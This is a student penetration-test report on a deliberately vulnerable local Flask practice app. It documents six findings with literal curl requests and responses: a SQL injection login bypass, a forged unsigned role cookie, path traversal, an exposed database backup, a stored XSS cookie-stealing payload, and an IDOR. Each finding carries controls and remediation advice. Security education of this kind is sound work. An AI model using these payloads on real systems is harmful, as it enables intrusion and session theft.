# Mini Project 4 pentest report: Vuln Hub

Target: a deliberately vulnerable Flask application, the Track A practice target
supplied for this assignment.
Test date: 29 September 2026.
Result: six planted vulnerabilities identified and exploited, six flags
captured, all six accepted by the instructor's checker.

The full technical record for this work is `pocs.md`, which holds
the literal request and the literal response for each finding, together with the
controls run alongside it. `recon.md` holds the attack-surface map that the
testing was planned from, with a source citation for every claim. This report
summarises those two documents and does not replace them.

Two conventions apply to the quotations below. The request lines in section 3 are
copied from `pocs.md` exactly, including every command-line flag. And where an em
dash appears inside a quoted response block it is the target's own output, copied
as received: the application's templates render message titles with a dash
character, so any faithful capture of those pages contains one. No em dash
appears in the prose of this report.

## 1. Scope and authorization

This was an **authorized** penetration test.

- The target was assigned by the course instructor as the Mini Project 4
  cybersecurity exercise. The application is intentionally vulnerable, it is
  supplied with a note on its first lines stating that it is deliberately
  insecure, and capturing flags by exploiting its bugs is the assigned work.
- The target ran **locally on 127.0.0.1**, on the tester's own machine. It binds
  the loopback interface unless a host override is supplied.
- **Only this application was tested.** No other system, host, service, or
  network was in scope, and none was touched.
- The instance used for all testing reported no default-seed warning banner,
  which confirms it was started with the seed belonging to this account and that
  the captured flags are the valid ones for it.

Testing anything outside this scope would be an academic honesty violation. The
boundary was treated as absolute: every request in this report and in `pocs.md`
was sent to `http://127.0.0.1:5000`.

## 2. Methodology

**Source review first.** Before any request, the application source was read end
to end and all nine templates were read, and the result was recorded in
`recon.md`. That document maps every route, its methods, whether it requires a
session, every place user input enters the application, and where each input
goes. Every claim in it cites a line of `app.py` or a template line. Four
questions the source could not settle were listed explicitly as unresolved, with
the request that would settle each, rather than guessed at. No requests were sent
while that map was being written.

**One challenge at a time.** Each of the six vulnerabilities was worked in a
separate pass. For each one the hypothesis came from the recon map, and the
hypothesis was then tested with a single literal request over HTTP rather than
reasoned about further.

**A control alongside every exploit.** Each successful request was paired with a
control that rules out the obvious alternative explanation:

- The login bypass was retried against the same account with a wrong password,
  which returns `Invalid credentials.` That rules out a guessed credential as the
  cause.
- The message-disclosure request was run twice more: once as the ownership-filtered
  list route, which does not show the record, and once with no session at all,
  which is refused. Those two together separate a missing ownership check from a
  route that is open to everyone.
- The vault escalation had the genuine cookie refused first, then a username that
  does not exist in the database accepted. The second result shows the
  authorization decision never consults the database.
- The file-read finding was repeated with the same filename minus the traversal
  segment, which returns `404`. That is what shows the segment is the cause and
  not an over-broad directory.
- The backup disclosure was followed by a request for a name that does not exist,
  which returns `404`. The successful response is therefore a real hit rather
  than a blanket response from the route.
- The cross-site scripting finding stands on its own: the payload comes back from
  the page as stored markup, which establishes the defect without relying on the
  simulated victim that later executed it.

**Verification against a replay harness.** The findings were not accepted on the
strength of their own prose. `pocs/replay.py` derives all six flags itself by
exploiting each bug over HTTP, holding one function per finding, and it opens no
file to obtain a flag: the only file it reads is `submission.txt`, and only at
the end, to compare its captures against what was submitted. A mismatch exits
non-zero. The harness was additionally exercised with `submission.txt`
temporarily replaced by bogus values, and it still captured the six real flags
over the network and reported the disagreement in both directions, which is what
shows the flag values come from the target rather than from a file.

Flag status was judged by exit code from `verify.py`, never by reading its
printed text.

## 3. Findings

Six vulnerabilities were confirmed. They are listed highest severity first.

| # | Class | Route | Severity | Flag |
|---|---|---|---|---|
| 1 | SQL injection | `POST /login` | Critical | `FLAG{sqli_0883918f1b72}` |
| 2 | Broken authorization (unsigned client-side role) | `GET /vault` | Critical | `FLAG{authz_5e08dfcda13b}` |
| 3 | Path traversal | `GET /download` | High | `FLAG{traversal_a0f6cbbad304}` |
| 4 | Sensitive data exposure | `GET /backups/<path:name>` | High | `FLAG{exposure_09e041147788}` |
| 5 | Stored cross-site scripting | `POST /guestbook` | High | `FLAG{xss_bef03a753643}` |
| 6 | Insecure direct object reference | `GET /messages/<int:msg_id>` | Medium | `FLAG{idor_c143bbc0c939}` |

### 3.1 SQL injection (Critical)

**Class:** SQL injection in the authentication query, leading to authentication
bypass.

**Severity:** Critical. It requires no credentials, no session, and no user interaction, and its outcome
is the administrator's identity, which is the highest privilege in the
application for reading data. It is also the most direct finding to exploit:
one request, one payload.**

**How it was found and exploited.** The recon map flagged the login handler as building
its query by string interpolation rather than parameter binding, with both form
fields as the interpolated values. That left the password condition removable by injecting a quote to close the username literal and a
comment marker to discard the remainder of the statement. A valid account
password was never needed. The injected statement returned the administrator's
row, and the handler writes the returned row's username and role into the
session cookie, so the bypass issued an administrator cookie. The flag is the
administrator's private note, read back from the dashboard with that cookie.

**Evidence.** The literal request:

```
curl -s -i -c jar.txt -b jar.txt -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x"
```

Response:

```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: auth=YWRtaW46YWRtaW4=; Path=/
```

The cookie decodes to `admin:admin`. The `--` sequence comments out the password
condition, so the database executes the equivalent of `SELECT id, username, role
FROM users WHERE username = 'admin'`, and the handler accepts any non-empty
result. The payload must still select the same three columns, because the handler
reads `username` and `role` from the returned row by name.

Control: the same account with a wrong password returns `200` and the text
`Invalid credentials.`, which shows the bypass came from the injection and not
from a guessed credential. A normal login for the public test account was also
run, returning the same `302`, to show the success path was intact.

Full record, including the reconstructed SQL and the wire bytes: `pocs.md`
section 1. Source: `app.py:210` to `app.py:223`.

**Remediation.** Use parameter binding for the query, passing the username and
password as bound parameters instead of interpolating them into the statement
text. This is the actual fix and it removes the vulnerability completely; the
query happens to be against SQLite, but the requirement is the same on every
database. Two further corrections belong with it. Do not return the database's
error text to the client, because that reflection tells an attacker when injected
SQL is malformed; the current handler renders the exception message into the
page. And passwords should not be compared as plaintext columns at all, but
stored as a salted hash and verified with a comparison function designed for the
purpose. Neither of those last two changes is what stops the injection, but both
are required before the login can be called sound.

### 3.2 Broken authorization: unsigned client-side role (Critical)

**Class:** Broken access control, specifically an authorization decision made
from a client-controlled value with no integrity protection.

**Severity:** Critical. It needs no credentials and no user interaction, and it
yields the highest-privilege role the application recognises. The attacker does
not even need an account: a control in `pocs.md` reaches the protected resource
with a username that does not exist in the database.

**How it was found and exploited.** The vault route's whole authorization decision,
according to the recon map, is a comparison of one role string. That role arrives
in the session cookie, which is a base64 encoding of username and role with no
signature on it. The cookie was therefore treated as editable input.

The proof of concept deliberately starts from a real cookie: a normal login was
performed to obtain a genuinely issued cookie, which was then refused by the
protected route, and only then was the role component replaced while the username
component was left byte-identical. That sequence shows a server-issued value being
tampered with, rather than a cookie fabricated from nothing.

**Evidence.** Before, a real issued cookie, refused:

```
curl -s -o v_real.html -w "http_code=%{http_code}\n" -b alice2.txt \
  http://127.0.0.1:5000/vault
```

which printed `http_code=403`. The cookie `YWxpY2U6dXNlcg==` decodes to
`alice:user`. After replacing only the role, `YWxpY2U6c3VwZXJhZG1pbg==` decodes
to `alice:superadmin`, and:

```
curl -s -o v_forged.html -w "http_code=%{http_code}\n" \
  -H "Cookie: auth=YWxpY2U6c3VwZXJhZG1pbg==" \
  http://127.0.0.1:5000/vault
```

returned `http_code=200`, with this response body:

```
<p>Access granted, superadmin.</p>
<p class="note">FLAG{authz_5e08dfcda13b}</p>
```

Two controls matter most. A cookie for the same user with the role
`admin`, which is the highest role that exists in the database, is still refused,
so the check is the literal string `superadmin` rather than any notion of
privilege. And a cookie naming a username absent from the database, with the role
`superadmin`, is granted: the dashboard reports `(no note on file)` for that
username, which is the branch taken when the user lookup finds no row, yet the
vault still opens. A username that does not exist cannot hold a role in the
database, so the authorization decision cannot be consulting the database at all.
It is reading the role out of the cookie and comparing the string.

Full record, including both response bodies and all three controls: `pocs.md`
section 4. Source: `app.py:182` to `app.py:184` (cookie construction) and
`app.py:314` (the comparison).

**Remediation.** Stop storing authorization state on the client. The role should
be resolved server-side from the authenticated identity on each request, for
example by looking it up from the users table, so that the client never supplies
it. If session state must remain client-side, it has to be tamper-evident: sign
the cookie with a server-side secret key and reject any value that fails
verification. The application currently constructs its Flask object with no
secret key at all, so this needs a key to be configured first. Note what is not a
fix: renaming the role, making the string harder to guess, or hiding the vault
route. None of those change the fact that the value being trusted arrives from
the client.

### 3.3 Path traversal (High)

**Class:** Path traversal, leading to disclosure of files outside the served
directory.

**Severity:** High. Unauthenticated, no user interaction, and the reach is
bounded only by what the application process can read, since the requested name
is not checked at all. It ranks below the two findings above because the impact
is disclosure rather than a change of privilege or identity.

**How it was found and exploited.** The download handler takes a filename from the
query string, joins it onto the served directory, and opens the result. The recon
map lists what is absent: no basename call, no normalisation, no rejection of
parent-directory segments, no allowlist. The generated files include a note in a
directory that is a sibling of the served one, so one parent-directory segment
reaches it. Because the code checks the joined
path not at all, the same defect also means a name that is an absolute path
escapes the served directory entirely.

**Evidence.** The literal request:

```
curl -s -w "\n[http_code=%{http_code}]\n" \
  "http://127.0.0.1:5000/download?file=../private/employee_notes.txt"
```

Response, `200`, with the request line `GET /download?file=../private/employee_notes.txt HTTP/1.1`
sent with the segment unencoded:

```
CONFIDENTIAL - employees only
If you can read this through the download endpoint, the path filter failed.
FLAG{traversal_a0f6cbbad304}
```

The file's own text names the condition that produced it. No session was sent;
the route has no authentication. Control: the same filename requested without the
parent-directory segment returns `404`, which shows the target file is not in the
served directory and that the segment is what reaches it. A second control, the
percent-encoded form of the same segment, also returns the flag, which
establishes that there is no filter being bypassed by encoding. There is simply
no filter.

Full record, including all five controls: `pocs.md` section 5. Source:
`app.py:319` to `app.py:329`.

**Remediation.** The fix is containment, not string matching. Resolve the
requested name to a real absolute path and verify that the result is inside the
served directory, refusing anything that is not. Werkzeug supplies `safe_join`
for exactly this. Rejecting `..` by substring comparison is the weaker fix and
should not be relied on, because encoded and alternative path forms defeat
substring checks. Serving files through a route like this is itself questionable;
where the set of downloadable files is known, an allowlist of names is both
simpler and safer than any path arithmetic.

### 3.4 Sensitive data exposure (High)

**Class:** Sensitive data exposure, specifically a sensitive directory served by
an unauthenticated route.

**Severity:** High. Unauthenticated and immediate. What is disclosed is a
database backup containing seeded secrets, which is the kind of file an attacker
looks for first. It is a disclosure finding, not a privilege or integrity one,
and the response is plain text, so it cannot be used as a scripting sink.

**How it was found and exploited.** The application serves a robots file whose only
content is a directive disallowing a backup directory, and the route serving that
directory performs no authentication check, no session lookup, and no role test.
Both facts are in the recon map. The directive was treated as the discovery hint
it is, and the file was then requested at its own path. No
traversal segment appears in the request, which is what makes this a disclosure
bug and not a traversal one.

**Evidence.** The discovery path:

```
curl -s -w "\n[http_code=%{http_code}]\n" http://127.0.0.1:5000/robots.txt
```

which returned `200` and this body:

```
User-agent: *
Disallow: /backups/
```

The request, at the exact path the directive names, with no parent-directory
segment:

```
curl -s -w "\n[http_code=%{http_code}]\n" \
  http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

Response, `200`, `Content-Type: text/plain`:

```
-- database backup (should NOT be world-readable)
-- left in /backups/ by mistake
INSERT INTO secrets VALUES ('FLAG{exposure_09e041147788}');
```

No cookie was sent. Controls: the directory requested without a filename returns
Werkzeug's own not-found page, so this route fetches files rather than listing a
directory, and a name that does not exist returns the application's `404`
branch, so a successful response is a real hit rather than a blanket response.
One further control is recorded rather than used: the same file could also be
reached through the download route with a parent-directory segment. That request
belongs to finding 3.3 and was deliberately withheld here so that the two
findings do not blur.

Full record: `pocs.md` section 6. Source: `app.py:332` to `app.py:347`, with the
file planted at `app.py:170` to `app.py:175`.

**Remediation.** Move the backup out of the web-accessible tree, which is the
real correction: nothing that should not be public belongs anywhere under a
directory the application serves. Where an application must serve generated
files, require authentication and authorization on the route and serve only
allowlisted names. The robots directive must not be relied on and should be
removed from the security reasoning altogether: it is a convention that
well-behaved crawlers honour voluntarily, the server enforces nothing, and
naming the path advertises its location to anyone who reads the file.

### 3.5 Stored cross-site scripting (High)

**Class:** Stored cross-site scripting, leading to theft of an administrator's
session cookie.

**Severity:** High. Writing the payload requires no account, and it executes in
a privileged user's browser and steals that user's cookie, which is session
takeover. It sits below the findings above because it needs a privileged victim
to load the page, while the others need no victim at all.

**How it was found and exploited.** Comment bodies are stored without sanitisation
and rendered through the template's safe filter, which switches off autoescaping
for that expression. The recon map identified it as the only unescaped output in
the whole template set, and also recorded that a simulated administrator visits
new comments along with the conditions that visitor applies before acting on one. The payload was written to satisfy
those conditions and to point at the endpoint that records exfiltrated data, and
it was submitted without logging in.

**Evidence.** The literal request, with no session:

```
curl -s -i -X POST http://127.0.0.1:5000/guestbook \
  --data-urlencode "comment=<script>fetch('/grab?'+document.cookie)</script>"
```

The payload is served back as markup in the page, which is the scripting defect
itself, independently of any victim:

```
<span class="text"><script>fetch('/grab?'+document.cookie)</script></span>
```

With autoescaping in force that would have been emitted as `&lt;script&gt;`. The
simulated administrator then runs the script and the captured value is readable
at the collection endpoint:

```
<li><code>session=admin; flag=FLAG{xss_bef03a753643}</code></li>
```

Two details show this is the victim's cookie and not a coincidence. The value
begins
with the administrator's session identifier, a string that was never supplied by
the attacker, so the only party that could have provided it is the victim. And
the collection endpoint is itself unauthenticated, which is visible in the
response because the navigation bar shows no logout link, so the payload needs no
session to collect its own result.

Full record, including the payload's fit against each condition the victim
applies: `pocs.md` section 3. Source: `guestbook.html:17` for the unescaped
output, `app.py:273` to `app.py:289` for the write path, and `app.py:358` to
`app.py:397` for the simulated victim.

**Remediation.** Remove the safe filter from that expression so the template
escapes comment bodies like every other value in the application. Escaping output
is the correct control here, for a reason worth being precise about: the value
must be
stored and later displayed as text, so escaping at the point of output preserves
the data and removes the execution. Storing pre-escaped or stripped input is the
weaker approach, because it corrupts legitimate content and tends to be applied
inconsistently. Two supporting measures belong with the fix. Set a
content-security policy that disallows inline script, which would have stopped
this payload even with the filter in place. And set the session cookie's
HttpOnly attribute, which this application does not do, so that script running in
the page cannot read it in the first place.

### 3.6 Insecure direct object reference (Medium)

**Class:** Insecure direct object reference, specifically a missing ownership
check on an object fetched by a client-supplied identifier.

**Severity:** Medium. The impact is horizontal access to other users' records,
which is serious, but it needs a valid session, so an anonymous visitor cannot
reach it the way findings 3.1 to 3.5 can. It is a confidentiality finding rather
than a privilege escalation.

**How it was found and exploited.** The message detail route fetches a message by
identifier alone. It pulls the owner column and never compares it to the caller,
while the list route does filter by owner. All three observations are in the recon
map. The list route therefore discloses the identifiers the caller may see,
and the detail route will serve any identifier. A normal login was used, and the
identifier of a record belonging to another user was requested.

**Evidence.** The session is a genuine server-issued one. The response to the
login decodes to `alice:user`, and the list route shows only the two records that
account owns:

```
curl -s -b alice.txt http://127.0.0.1:5000/messages
```

```
<h1>Your messages</h1>
    <li><a href="/messages/4">#4 — Grocery list</a></li>
    <li><a href="/messages/5">#5 — Vacation</a></li>
```

Requesting another user's record with that same session:

```
curl -s -o m1.html -w "http_code=%{http_code}\n" -b alice.txt \
  http://127.0.0.1:5000/messages/1
```

which returned `http_code=200` and this body:

```
  <h1>#1 — Onboarding secret</h1>
  <p class="meta">To: admin</p>
  <p>Internal only. Do not share. FLAG{idor_c143bbc0c939}</p>
```

The page itself renders the record's owner, so the response states that the
record belongs to `admin` while being served to a session the application knows
is `alice`. The list route refusing to show the same record is what turns this from a data
leak into a broken access control bug. Controls: an identifier that does not exist returns
`404`, so the successful response is a real hit and not a route that returns
everything, and the same request without a session is redirected to the login
page, so the route is genuinely authenticated and the defect is specifically the
missing ownership check rather than an open route.

The SQL on this route is parameter bound, so this is not an injection; the
identifier is bound as a value. The two bugs sit on adjacent lines and look
similar, and the report states the difference because the fixes are different.

Full record: `pocs.md` section 2. Source: `app.py:259` to `app.py:270`.

**Remediation.** Add the ownership condition to the query, filtering by the
authenticated user's identity as well as by identifier, so that a record which is
not the caller's is indistinguishable from one that does not exist. Doing the
check in the query is preferable to fetching the row and comparing afterwards,
because it avoids returning the record into application memory at all and keeps
the check in one place. The list route already demonstrates the correct pattern,
so the fix is to make the detail route consistent with it. Returning `404` rather
than `403` for a record the caller may not see is deliberate, since a distinct
forbidden response confirms the record exists.

## 4. Two findings that could be confused

Findings 3.3 and 3.4 both end with a file from the application's directory tree
being returned to an unauthenticated client, and they can be mistaken for one
another. They are separate defects with separate causes and separate fixes.

**3.4 is sensitive data exposure on an unauthenticated route. It is not path
traversal.** The request contains no parent-directory segment and no encoded
variant of one. The path in the URL maps directly onto the file's own location
inside the directory the route serves. Nothing crosses a boundary. The file is
reachable because it sits inside a directory that is served to anyone who asks,
and because nothing in front of that directory checks who is asking. The
sensitive file's placement inside the served tree is the root cause as much as
the missing authentication is. The fix is to move the file out of the tree and
require authorization on the route, not to filter the requested name.

**3.3 is path traversal.** There the file lives outside the served directory and
the request climbs out of it with a parent-directory segment. The served
directory is correct to serve; the failure is that the joined path is never
checked for containment, so a name the client supplies can leave it. The fix is a
containment check on the resolved path.

The two overlap in effect, so the distinction has to be stated.
The download route can also reach the backup file, and the backup route can also
reach the private note, each by a parent-directory segment. Both flags are
nonetheless attributed to a route that reaches the file with no traversal segment
at all, so neither finding rests on the other's mechanism. The overlapping
request was sent and its result recorded, but it is filed under the traversal
finding and was deliberately not used as the proof for the exposure flag.

## 5. What was not tested, and why

- **The absolute-path question on the download route.** The recon map noted that
  if the supplied name is an absolute path, the join may discard the served
  directory entirely, which would mean the endpoint reads paths anywhere on the
  filesystem rather than merely outside the served directory. This is recorded as
  unresolved because no line of the application states the behaviour, and it is
  deliberately **not tested**: confirming it means reading a file outside the
  application's own directory, which is outside the authorized scope. It is
  reported as an open question, not as a finding. If it were confirmed it would be
  a second consequence of the same missing containment check in finding 3.3, and
  it would raise that finding's severity.
- **Three further unresolved questions from the recon map**, each recorded with
  the request that would settle it, and each deliberately left alone because none
  affects a finding: whether this Werkzeug version's integer converter accepts a
  leading sign on the message identifier, which would only widen enumeration in
  finding 3.6; whether the simulated victim's URL-matching pattern accepts sinks
  other than the one used, which affects payload design rather than whether
  scripting is possible; and whether the session cookie carries the HttpOnly
  attribute, which is a control observation rather than a vulnerability in
  itself.
- **The administrator's password.** Not attacked. The recon map records that it
  is regenerated randomly on every process start, so there is no fixed credential
  to test. Finding 3.1 bypasses the login without needing it, and finding 3.2
  escalates without any account at all.
- **Anything outside the application.** No other host or service was probed. No
  denial-of-service testing, load testing, or automated fuzzing was performed,
  because none is required to demonstrate these six defects and all of it would
  fall outside the assigned scope.
- **The victim in finding 3.5 is simulated, not a browser.** The application ships
  a stand-in for an administrator that recognises specific conditions in a
  comment and performs a request with an administrator cookie. The finding is
  therefore demonstrated against that simulation. Its real-world equivalent, a
  privileged user loading the page in a browser, follows directly from the
  unescaped output shown in the evidence, but that step was not performed with a
  real browser.
- **The environment is a single local instance with a fixed seed.** Flags derive
  from the seed, so they are stable for this account across restarts. Findings
  were confirmed against one running process; no attempt was made to test the
  application under a different seed or in a container.
